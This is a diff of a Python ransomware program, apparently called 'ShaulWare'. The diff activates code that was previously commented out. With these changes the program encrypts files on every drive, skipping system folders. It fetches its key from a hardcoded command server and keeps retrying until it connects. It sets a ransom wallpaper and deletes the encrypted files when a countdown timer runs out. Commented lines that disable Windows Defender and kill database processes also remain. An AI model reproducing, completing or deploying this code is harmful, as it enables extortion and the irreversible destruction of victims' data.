@@ -10,6 +10,7 @@ from win32 import win32api
 from tkinter import Text
 from datetime import datetime, timedelta
 from threading import Thread
+import time
 
 
 class Timer:
@@ -23,12 +24,11 @@ class Timer:
 
     def start_clock(self):
         if self.hours == 0 and self.minutes == 0 and self.seconds == 1:
-           # for r, d, f in os.walk():
-           #     for file in f:
-           #         if file.split(".")[-1] == "SHAOOLY":
-           #             filepath = os.path.join(r, file)
-           #             os.remove(filepath)
-           #
+            for r, d, f in os.walk():
+                for file in f:
+                    if file.split(".")[-1] == "SHAOOLY":
+                        filepath = os.path.join(r, file)
+                        os.remove(filepath)
             return  # Stop timer
 
         self.seconds -= 1
@@ -45,9 +45,9 @@ class Timer:
 
 class Encrypt(Thread):
 
-    def __init__(self, drive, key):
+    def __init__(self, cur_drive, key):
         Thread.__init__(self)
-        self.drive = drive
+        self.drive = cur_drive
         self.fernet = Fernet(key)
         self.accepted_extensions = [
                                     "Sxw",
@@ -226,48 +226,57 @@ class Encrypt(Thread):
                          'Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg',
                          'Y2xhc3MgYWxlcnQ=.PNG',
                          'Yml0Y29pbg==.png',
-                         'Z3JlZW4=.png']
+                         'Z3JlZW4=.png', 'main', 'main.exe']
+        self.exclude = {'$Recycle.Bin', '$WinREAgent', 'Documents and Settings', 'DumpStack.log.tmp',
+                        'pagefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)', 'ProgramData', 'Recovery',
+                        'swapfile.sys', 'System Volume Information', 'Windows'}
 
     def run(self):
-        for root, _dirs, filenames in os.walk(self.drive):
-            if root.split("\\")[1] not in ["Windows", "Program Files", "Program Files (x86)", "PerfLogs"]:
-                for file in filenames:
-                    if file.split(".")[-1] in self.accepted_extensions and file not in self.my_files:
-                        filepath = os.path.join(root, file)
-                        file_extension = file.split(".")[-1]
-                        file_name = file.split(".")[0]
-                        enc_file_name = f'{root}/{file_name}.SHAOOLY'
-                        if os.path.getsize(filepath) < self.max_size and 'ShaulWare' not in filepath:
-                            try:
-                                with open(filepath, 'rb') as byte_file:
-                                    enc_file_content = self.fernet.encrypt(byte_file.read())
-                                    os.remove(filepath)
+        for root, dirs, filenames in os.walk(self.drive, topdown=True):
+            dirs[:] = [d for d in dirs if d not in self.exclude]
+            for file in filenames:
+                if file.split(".")[-1] in self.accepted_extensions and file not in self.my_files:
+                    filepath = os.path.join(root, file)
+                    file_extension = file.split(".")[-1]
+                    file_name = file.split(".")[0]
+                    enc_file_name = f'{root}/{file_name}.SHAOOLY'
+                    if os.path.getsize(filepath) < self.max_size and 'ShaulWare' not in filepath:
+                        try:
+                            with open(filepath, 'rb') as byte_file:
+                                enc_file_content = self.fernet.encrypt(byte_file.read())
+                                os.remove(filepath)
+                                with open(enc_file_name, 'x') as encrypted_file:
+                                    encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
+                        except FileExistsError as _fileExists:
+                            index = 0
+                            while True:
+                                index += 1
+                                try:
+                                    enc_file_name = f'{root}/{file_name}({index}).SHAOOLY'
                                     with open(enc_file_name, 'x') as encrypted_file:
                                         encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
-                            except FileExistsError as _fileExists:
-                                index = 0
-                                while True:
-                                    index += 1
-                                    try:
-                                        enc_file_name = f'{root}/{file_name}({index}).SHAOOLY'
-                                        with open(enc_file_name, 'x') as encrypted_file:
-                                            encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
-                                        break
-                                    except FileExistsError as _fileExits:
-                                        pass
-                            except OSError as _OsError:
-                                pass
+                                    break
+                                except FileExistsError as _fileExits:
+                                    pass
+                        except OSError as _OsError:
+                            pass
+                        except ValueError as _ValueError:
+                            pass
 
 
 class Decrypt(Thread):
-    def __init__(self, drive, key):
+    def __init__(self, cur_drive, key):
         Thread.__init__(self)
-        self.drive = drive
+        self.drive = cur_drive
         self.fernet = Fernet(key)
+        self.exclude = {'$Recycle.Bin', '$WinREAgent', 'Documents and Settings', 'DumpStack.log.tmp',
+                        'pagefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)', 'ProgramData', 'Recovery',
+                        'swapfile.sys', 'System Volume Information', 'Windows'}
 
     def run(self):
         print(f"Started denrypting drive {self.drive}")
-        for r, d, f in os.walk(self.drive):
+        for r, dirs, f in os.walk(self.drive):
+            dirs[:] = [d for d in dirs if d not in self.exclude]
             for file in f:
                 filepath = os.path.join(r, file)
                 filename = filepath.split('/')[-1].split('.')[0]
@@ -289,7 +298,12 @@ class RansomwareClient:
         host = '139.162.131.50'
         port = 17694
         self.my_socket = socket()
-        self.my_socket.connect((host, port))
+        while True:
+            try:
+                self.my_socket.connect((host, port))
+                break
+            except Exception as N:
+                time.sleep(5)  # Buffer for 5 seconds
         publickey, privatekey = rsa.newkeys(512)
         self.my_socket.send(pickle.dumps((publickey, gethostname())))
         received_key = pickle.loads(self.my_socket.recv(1024))
@@ -330,10 +344,10 @@ class Interface:
 
     def decryption_start(self):
         if self.canDecrypt:
-            # drives = win32api.GetLogicalDriveStrings()
-            # drives = drives.split('\000')[:-1]
-            # for drive in drives:
-            #     Decrypt(drive, SYMMETRIC_KEY).start()
+            decrypt_drives = win32api.GetLogicalDriveStrings()
+            decrypt_drives = decrypt_drives.split('\000')[:-1]
+            for dec_drive in decrypt_drives:
+                Decrypt(dec_drive, SYMMETRIC_KEY).start()
             self.canvas['background'] = '#558c0d'
             self.canvas.delete('all')
             self.clock.destroy()
@@ -440,34 +454,34 @@ class Interface:
 
 
 def set_wallpaper(path):
-    changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
-    ctypes.windll.user32.SystemParametersInfoA(win32con.SPI_SETDESKWALLPAPER, 0, path.encode(), changed)
+    try:
+        changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
+        ctypes.windll.user32.SystemParametersInfoA(win32con.SPI_SETDESKWALLPAPER, 0, path.encode(), changed)
+    except Exception as N:
+        pass
 
 
 if __name__ == "__main__":
+    time.sleep(60)
     client = RansomwareClient()
     SYMMETRIC_KEY = client.get_key()
     if not os.path.exists('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY'):
-        with open('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY', 'x') as check:
-            check.write('15TXmdeQINeR15DXlCDXnNeR15zXldeqINeQ16DXmSDXqNeV15DXlCDXnNeUINeR16LXmdeg15nXmdedINeR15DXlCDXot'
-                        'edINei15XXkyDXkNeo15HXoiDXl9eR16jXldeqINee15LXkdei16rXmdeZ150g16nXqteq15Qg15nXldeq16gg157Xk9eZ'
-                        'INeV15TXmdeQINem16jXmdeb15Qg16fXpteqINee15nXnSDXm9eV15zXnSDXm9eR16gg15nXldeT16LXmdedINep15TXmd'
-                        'eQINec15Ag16nXnteUINeq16nXldee16og15zXkSDXm9eT15DXmSDXqdeq16nXkSDXnNeQINee16HXldeSINeU15HXl9eV'
-                        '16jXldeqINep15nXqdeZ157XlSDXnNeaINei15XXp9eR')
-        # os.system("sc stop WinDefend")
-        # os.system("attrib +h .")
-        # os.system("icacls . /grant Everyone:F /T /C /Q")
-        # os.system("taskkill.exe /f /im mysqld.exe")
-        # os.system("taskkill.exe /f /im sqlwriter.exe")
-        # os.system("taskkill.exe /f /im sqlserver.exe")
-        # os.system("taskkill.exe /f /im MSExchange*")
-        # os.system("taskkill.exe /f /im Microsoft.Exchange.*")
-        # drives = win32api.GetLogicalDriveStrings()
-        # drives = drives.split('\000')[:-1]
-        # for drive in drives:
-        #     pass
-        #     # Encrypt(drive, SYMMETRIC_KEY).start()
-        # set_wallpaper("Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg")
+        try:
+            with open('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY', 'x') as check:
+                check.write('15TXmdeQINeR15DXlCDXnNeR15zXldeqINeQ16DXmSDXqNeV15DXlCDXnNeUINeR16LXmdeg15nXmdedINeR15DXlCDXot'
+                            'edINei15XXkyDXkNeo15HXoiDXl9eR16jXldeqINee15LXkdei16rXmdeZ150g16nXqteq15Qg15nXldeq16gg157Xk9eZ'
+                            'INeV15TXmdeQINem16jXmdeb15Qg16fXpteqINee15nXnSDXm9eV15zXnSDXm9eR16gg15nXldeT16LXmdedINep15TXmd'
+                            'eQINec15Ag16nXnteUINeq16nXldee16og15zXkSDXm9eT15DXmSDXqdeq16nXkSDXnNeQINee16HXldeSINeU15HXl9eV'
+                            '16jXldeqINep15nXqdeZ157XlSDXnNeaINei15XXp9eR')
+        except PermissionError as _PermissionError:
+            pass
+        drives = win32api.GetLogicalDriveStrings()
+        drives = drives.split('\000')[:-1]
+        for drive in drives:
+            t = Encrypt(drive, SYMMETRIC_KEY)
+            t.start()
+        t.join()
+        set_wallpaper("Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg")
     my_interface = Interface(client)
     my_interface.run()  # NOTE: The interface will be started last.
 
